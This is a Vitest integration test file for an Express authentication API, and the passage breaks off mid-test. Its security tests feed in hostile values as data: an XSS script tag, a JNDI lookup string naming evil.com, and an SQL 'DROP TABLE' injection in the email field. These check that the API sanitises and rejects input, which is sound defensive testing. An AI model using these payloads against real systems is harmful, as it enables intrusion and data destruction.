import { describe, it, expect, vi, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import rateLimit from 'express-rate-limit';
import authRoutes from '../auth.js';
import cacheService from '../../services/cacheService.js';

// Mock dependencies
vi.mock('../../services/cacheService.js');
vi.mock('jsonwebtoken');
vi.mock('bcryptjs');

// Mock console for logging
const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

describe('Auth API Integration Tests', () => {
  let app;
  let server;

  beforeAll(() => {
    // Create Express app
    app = express();
    app.use(express.json());
    app.use('/api/auth', authRoutes);

    // Start server
    server = app.listen(0);
  });

  beforeEach(() => {
    vi.clearAllMocks();
    
    // Setup default mocks
    cacheService.get.mockResolvedValue(null);
    cacheService.set.mockResolvedValue(true);
    cacheService.del.mockResolvedValue(true);
    cacheService.isConnected.mockReturnValue(true);
    
    jwt.sign.mockReturnValue('mock-jwt-token');
    jwt.verify.mockReturnValue({ userId: 'user-123', email: 'test@example.com' });
    
    bcrypt.hash.mockResolvedValue('hashed-password');
    bcrypt.compare.mockResolvedValue(true);
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  afterAll((done) => {
    server.close(done);
  });

  describe('POST /api/auth/register', () => {
    const validRegistrationData = {
      email: 'test@example.com',
      password: 'SecurePass123!',
      firstName: 'John',
      lastName: 'Doe'
    };

    it('should register a new user successfully', async () => {
      // Mock user doesn't exist
      cacheService.get.mockResolvedValueOnce(null);
      
      const response = await request(app)
        .post('/api/auth/register')
        .send(validRegistrationData)
        .expect(201);

      expect(response.body).toEqual({
        success: true,
        message: 'User registered successfully',
        user: {
          id: expect.any(String),
          email: 'test@example.com',
          firstName: 'John',
          lastName: 'Doe',
          createdAt: expect.any(String)
        },
        token: 'mock-jwt-token'
      });

      expect(bcrypt.hash).toHaveBeenCalledWith('SecurePass123!', 12);
      expect(cacheService.set).toHaveBeenCalledWith(
        expect.stringContaining('user:'),
        expect.any(Object),
        3600 // 1 hour TTL
      );
      expect(jwt.sign).toHaveBeenCalledWith(
        expect.objectContaining({
          userId: expect.any(String),
          email: 'test@example.com'
        }),
        expect.any(String),
        { expiresIn: '24h' }
      );
    });

    it('should reject registration with existing email', async () => {
      // Mock user already exists
      cacheService.get.mockResolvedValueOnce({
        id: 'existing-user',
        email: 'test@example.com'
      });

      const response = await request(app)
        .post('/api/auth/register')
        .send(validRegistrationData)
        .expect(409);

      expect(response.body).toEqual({
        success: false,
        message: 'User with this email already exists'
      });

      expect(bcrypt.hash).not.toHaveBeenCalled();
      expect(jwt.sign).not.toHaveBeenCalled();
    });

    it('should validate required fields', async () => {
      const invalidData = {
        email: 'test@example.com'
        // Missing password, firstName, lastName
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(invalidData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Missing required fields',
        errors: expect.arrayContaining([
          'Password is required',
          'First name is required',
          'Last name is required'
        ])
      });
    });

    it('should validate email format', async () => {
      const invalidEmailData = {
        ...validRegistrationData,
        email: 'invalid-email'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(invalidEmailData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid email format'
      });
    });

    it('should validate password strength', async () => {
      const weakPasswordData = {
        ...validRegistrationData,
        password: '123' // Too weak
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(weakPasswordData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Password must be at least 8 characters long and contain uppercase, lowercase, number, and special character'
      });
    });

    it('should handle cache service errors gracefully', async () => {
      cacheService.get.mockRejectedValue(new Error('Cache unavailable'));

      const response = await request(app)
        .post('/api/auth/register')
        .send(validRegistrationData)
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: 'Internal server error'
      });

      expect(consoleErrorSpy).toHaveBeenCalledWith(
        'Registration error:',
        expect.any(Error)
      );
    });

    it('should handle bcrypt hashing errors', async () => {
      cacheService.get.mockResolvedValueOnce(null);
      bcrypt.hash.mockRejectedValue(new Error('Hashing failed'));

      const response = await request(app)
        .post('/api/auth/register')
        .send(validRegistrationData)
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: 'Internal server error'
      });
    });
  });

  describe('POST /api/auth/login', () => {
    const validLoginData = {
      email: 'test@example.com',
      password: 'SecurePass123!'
    };

    const mockUser = {
      id: 'user-123',
      email: 'test@example.com',
      firstName: 'John',
      lastName: 'Doe',
      password: 'hashed-password',
      createdAt: '2024-01-01T00:00:00.000Z'
    };

    it('should login user successfully', async () => {
      cacheService.get.mockResolvedValueOnce(mockUser);
      bcrypt.compare.mockResolvedValueOnce(true);

      const response = await request(app)
        .post('/api/auth/login')
        .send(validLoginData)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Login successful',
        user: {
          id: 'user-123',
          email: 'test@example.com',
          firstName: 'John',
          lastName: 'Doe',
          createdAt: '2024-01-01T00:00:00.000Z'
        },
        token: 'mock-jwt-token'
      });

      expect(bcrypt.compare).toHaveBeenCalledWith('SecurePass123!', 'hashed-password');
      expect(jwt.sign).toHaveBeenCalledWith(
        {
          userId: 'user-123',
          email: 'test@example.com'
        },
        expect.any(String),
        { expiresIn: '24h' }
      );
    });

    it('should reject login with non-existent email', async () => {
      cacheService.get.mockResolvedValueOnce(null);

      const response = await request(app)
        .post('/api/auth/login')
        .send(validLoginData)
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid email or password'
      });

      expect(bcrypt.compare).not.toHaveBeenCalled();
      expect(jwt.sign).not.toHaveBeenCalled();
    });

    it('should reject login with incorrect password', async () => {
      cacheService.get.mockResolvedValueOnce(mockUser);
      bcrypt.compare.mockResolvedValueOnce(false);

      const response = await request(app)
        .post('/api/auth/login')
        .send(validLoginData)
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid email or password'
      });

      expect(bcrypt.compare).toHaveBeenCalledWith('SecurePass123!', 'hashed-password');
      expect(jwt.sign).not.toHaveBeenCalled();
    });

    it('should validate required login fields', async () => {
      const invalidData = {
        email: 'test@example.com'
        // Missing password
      };

      const response = await request(app)
        .post('/api/auth/login')
        .send(invalidData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Email and password are required'
      });
    });

    it('should handle cache service errors during login', async () => {
      cacheService.get.mockRejectedValue(new Error('Cache unavailable'));

      const response = await request(app)
        .post('/api/auth/login')
        .send(validLoginData)
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: 'Internal server error'
      });
    });

    it('should handle bcrypt comparison errors', async () => {
      cacheService.get.mockResolvedValueOnce(mockUser);
      bcrypt.compare.mockRejectedValue(new Error('Comparison failed'));

      const response = await request(app)
        .post('/api/auth/login')
        .send(validLoginData)
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: 'Internal server error'
      });
    });

    it('should implement login rate limiting', async () => {
      // Make multiple rapid login attempts
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          request(app)
            .post('/api/auth/login')
            .send(validLoginData)
        );
      }

      const responses = await Promise.all(promises);
      
      // At least one should be rate limited (429)
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('POST /api/auth/logout', () => {
    const validToken = 'Bearer mock-jwt-token';

    it('should logout user successfully', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });

      const response = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', validToken)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Logout successful'
      });

      // Should blacklist the token
      expect(cacheService.set).toHaveBeenCalledWith(
        'blacklist:mock-jwt-token',
        true,
        86400 // 24 hours
      );
    });

    it('should require authentication token', async () => {
      const response = await request(app)
        .post('/api/auth/logout')
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'No token provided'
      });
    });

    it('should reject invalid tokens', async () => {
      jwt.verify.mockImplementation(() => {
        throw new Error('Invalid token');
      });

      const response = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid token'
      });
    });

    it('should handle cache errors during logout', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.set.mockRejectedValue(new Error('Cache unavailable'));

      const response = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', validToken)
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: 'Internal server error'
      });
    });
  });

  describe('GET /api/auth/profile', () => {
    const validToken = 'Bearer mock-jwt-token';
    const mockUser = {
      id: 'user-123',
      email: 'test@example.com',
      firstName: 'John',
      lastName: 'Doe',
      createdAt: '2024-01-01T00:00:00.000Z',
      preferences: {
        theme: 'dark',
        notifications: true
      }
    };

    it('should get user profile successfully', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);

      const response = await request(app)
        .get('/api/auth/profile')
        .set('Authorization', validToken)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        user: {
          id: 'user-123',
          email: 'test@example.com',
          firstName: 'John',
          lastName: 'Doe',
          createdAt: '2024-01-01T00:00:00.000Z',
          preferences: {
            theme: 'dark',
            notifications: true
          }
        }
      });

      expect(cacheService.get).toHaveBeenCalledWith('user:user-123');
    });

    it('should require authentication', async () => {
      const response = await request(app)
        .get('/api/auth/profile')
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'No token provided'
      });
    });

    it('should handle user not found', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(null);

      const response = await request(app)
        .get('/api/auth/profile')
        .set('Authorization', validToken)
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: 'User not found'
      });
    });

    it('should handle blacklisted tokens', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(true); // Token is blacklisted

      const response = await request(app)
        .get('/api/auth/profile')
        .set('Authorization', validToken)
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Token has been revoked'
      });
    });
  });

  describe('PUT /api/auth/profile', () => {
    const validToken = 'Bearer mock-jwt-token';
    const mockUser = {
      id: 'user-123',
      email: 'test@example.com',
      firstName: 'John',
      lastName: 'Doe',
      createdAt: '2024-01-01T00:00:00.000Z'
    };

    it('should update user profile successfully', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);

      const updateData = {
        firstName: 'Jane',
        lastName: 'Smith',
        preferences: {
          theme: 'light',
          notifications: false
        }
      };

      const response = await request(app)
        .put('/api/auth/profile')
        .set('Authorization', validToken)
        .send(updateData)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Profile updated successfully',
        user: {
          ...mockUser,
          firstName: 'Jane',
          lastName: 'Smith',
          preferences: {
            theme: 'light',
            notifications: false
          },
          updatedAt: expect.any(String)
        }
      });

      expect(cacheService.set).toHaveBeenCalledWith(
        'user:user-123',
        expect.objectContaining({
          firstName: 'Jane',
          lastName: 'Smith'
        }),
        3600
      );
    });

    it('should require authentication for profile update', async () => {
      const response = await request(app)
        .put('/api/auth/profile')
        .send({ firstName: 'Jane' })
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'No token provided'
      });
    });

    it('should validate profile update data', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);

      const invalidData = {
        email: 'newemail@example.com' // Email updates not allowed
      };

      const response = await request(app)
        .put('/api/auth/profile')
        .set('Authorization', validToken)
        .send(invalidData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Email cannot be updated through this endpoint'
      });
    });

    it('should handle user not found during update', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(null);

      const response = await request(app)
        .put('/api/auth/profile')
        .set('Authorization', validToken)
        .send({ firstName: 'Jane' })
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: 'User not found'
      });
    });
  });

  describe('POST /api/auth/change-password', () => {
    const validToken = 'Bearer mock-jwt-token';
    const mockUser = {
      id: 'user-123',
      email: 'test@example.com',
      password: 'hashed-old-password'
    };

    it('should change password successfully', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);
      bcrypt.compare.mockResolvedValueOnce(true); // Current password is correct
      bcrypt.hash.mockResolvedValueOnce('hashed-new-password');

      const passwordData = {
        currentPassword: 'OldPass123!',
        newPassword: 'NewPass123!'
      };

      const response = await request(app)
        .post('/api/auth/change-password')
        .set('Authorization', validToken)
        .send(passwordData)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        message: 'Password changed successfully'
      });

      expect(bcrypt.compare).toHaveBeenCalledWith('OldPass123!', 'hashed-old-password');
      expect(bcrypt.hash).toHaveBeenCalledWith('NewPass123!', 12);
      expect(cacheService.set).toHaveBeenCalledWith(
        'user:user-123',
        expect.objectContaining({
          password: 'hashed-new-password'
        }),
        3600
      );
    });

    it('should reject incorrect current password', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);
      bcrypt.compare.mockResolvedValueOnce(false); // Current password is incorrect

      const passwordData = {
        currentPassword: 'WrongPass123!',
        newPassword: 'NewPass123!'
      };

      const response = await request(app)
        .post('/api/auth/change-password')
        .set('Authorization', validToken)
        .send(passwordData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Current password is incorrect'
      });

      expect(bcrypt.hash).not.toHaveBeenCalled();
    });

    it('should validate new password strength', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValueOnce(mockUser);

      const passwordData = {
        currentPassword: 'OldPass123!',
        newPassword: 'weak' // Too weak
      };

      const response = await request(app)
        .post('/api/auth/change-password')
        .set('Authorization', validToken)
        .send(passwordData)
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'New password must be at least 8 characters long and contain uppercase, lowercase, number, and special character'
      });
    });

    it('should require authentication for password change', async () => {
      const response = await request(app)
        .post('/api/auth/change-password')
        .send({
          currentPassword: 'OldPass123!',
          newPassword: 'NewPass123!'
        })
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'No token provided'
      });
    });
  });

  describe('POST /api/auth/refresh-token', () => {
    const validRefreshToken = 'valid-refresh-token';

    it('should refresh token successfully', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com', type: 'refresh' });
      cacheService.get.mockResolvedValueOnce(validRefreshToken); // Refresh token exists in cache
      jwt.sign.mockReturnValueOnce('new-access-token');

      const response = await request(app)
        .post('/api/auth/refresh-token')
        .send({ refreshToken: validRefreshToken })
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        token: 'new-access-token',
        expiresIn: '24h'
      });

      expect(jwt.verify).toHaveBeenCalledWith(validRefreshToken, expect.any(String));
      expect(jwt.sign).toHaveBeenCalledWith(
        {
          userId: 'user-123',
          email: 'test@example.com'
        },
        expect.any(String),
        { expiresIn: '24h' }
      );
    });

    it('should reject invalid refresh token', async () => {
      jwt.verify.mockImplementation(() => {
        throw new Error('Invalid token');
      });

      const response = await request(app)
        .post('/api/auth/refresh-token')
        .send({ refreshToken: 'invalid-token' })
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Invalid refresh token'
      });
    });

    it('should reject expired refresh token', async () => {
      jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com', type: 'refresh' });
      cacheService.get.mockResolvedValueOnce(null); // Refresh token not in cache (expired)

      const response = await request(app)
        .post('/api/auth/refresh-token')
        .send({ refreshToken: validRefreshToken })
        .expect(401);

      expect(response.body).toEqual({
        success: false,
        message: 'Refresh token has expired'
      });
    });

    it('should require refresh token', async () => {
      const response = await request(app)
        .post('/api/auth/refresh-token')
        .send({})
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: 'Refresh token is required'
      });
    });
  });

  describe('Middleware Tests', () => {
    describe('Authentication Middleware', () => {
      it('should authenticate valid tokens', async () => {
        jwt.verify.mockReturnValueOnce({ userId: 'user-123', email: 'test@example.com' });
        cacheService.get.mockResolvedValueOnce(null); // Token not blacklisted

        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', 'Bearer valid-token')
          .expect(200);

        expect(jwt.verify).toHaveBeenCalledWith('valid-token', expect.any(String));
      });

      it('should reject requests without tokens', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .expect(401);

        expect(response.body.message).toBe('No token provided');
      });

      it('should reject malformed authorization headers', async () => {
        const response = await request(app)
          .get('/api/auth/profile')
          .set('Authorization', 'InvalidFormat')
          .expect(401);

        expect(response.body.message).toBe('Invalid token format');
      });
    });

    describe('Rate Limiting Middleware', () => {
      it('should implement rate limiting for sensitive endpoints', async () => {
        const requests = [];
        
        // Make multiple rapid requests
        for (let i = 0; i < 20; i++) {
          requests.push(
            request(app)
              .post('/api/auth/login')
              .send({
                email: 'test@example.com',
                password: 'password'
              })
          );
        }

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(res => res.status === 429);
        
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
        expect(rateLimitedResponses[0].body).toHaveProperty('message');
        expect(rateLimitedResponses[0].body.message).toContain('rate limit');
      });
    });
  });

  describe('Security Tests', () => {
    it('should sanitize input data', async () => {
      const maliciousData = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        firstName: '<script>alert("xss")</script>',
        lastName: '${jndi:ldap://evil.com/a}'
      };

      cacheService.get.mockResolvedValueOnce(null);

      const response = await request(app)
        .post('/api/auth/register')
        .send(maliciousData)
        .expect(201);

      // Should sanitize the malicious input
      expect(response.body.user.firstName).not.toContain('<script>');
      expect(response.body.user.lastName).not.toContain('${jndi:');
    });

    it('should prevent SQL injection attempts', async () => {
      const sqlInjectionData = {
        email: "test@example.com'; DROP TABLE users; --",
        password: 'SecurePass123!'
      };

      const response = await request(app)
        .post('/api/auth/login')
        .send(sqlInjectionData)
        .expect(400);

      expect(response.body.message).toBe('Invalid email format');
    });

    it('should implement CORS headers', async () => {
      const response = await request(app)
        .options('/api/auth/login')
        .expect(200);

      expect(response.headers).toHaveProperty('access-control-allow-origin');
      expect(response.headers).toHaveProperty('access-control-allow-methods');
      expect(response.headers).toHaveProperty('access-control-allow-headers');
    });

    it('should set security headers', async () => {
      const response = await request(app)
        .get('/api/auth/profile')
        .set('Authorization', 'Bearer valid-token');

      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options', 'DENY');
      expect(response.headers).toHaveProperty('x-xss-protection', '1; mode=block');
    });
  });

  describe('Performance Tests', () => {
    it('should handle concurrent authentication requests', async () => {
      const concurrentRequests = 50;
      const requests = [];

      jwt.verify.mockReturnValue({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValue({
        id: 'user-123',
        email: 'test@example.com',
        firstName: 'John',
        lastName: 'Doe'
      });

      for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
          request(app)
            .get('/api/auth/profile')
            .set('Authorization', 'Bearer valid-token')
        );
      }

      const startTime = Date.now();
      const responses = await Promise.all(requests);
      const endTime = Date.now();

      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });

      // Should complete within reasonable time (5 seconds)
      expect(endTime - startTime).toBeLessThan(5000);
    });

    it('should cache user data efficiently', async () => {
      jwt.verify.mockReturnValue({ userId: 'user-123', email: 'test@example.com' });
      cacheService.get.mockResolvedValue({
        id: 'user-123',
        email: 'test@example.com',
        firstName: 'John',
        lastName: 'Doe'
      });

      // Make multiple requests for the same user
      await request(app)
        .get('/api/auth/profile')
        .set('Authorization', 'Bearer valid-token')
        .expect(200);

      await request(app)
        .get('/api/auth/profile')
        .set('Authorization', 'Bearer valid-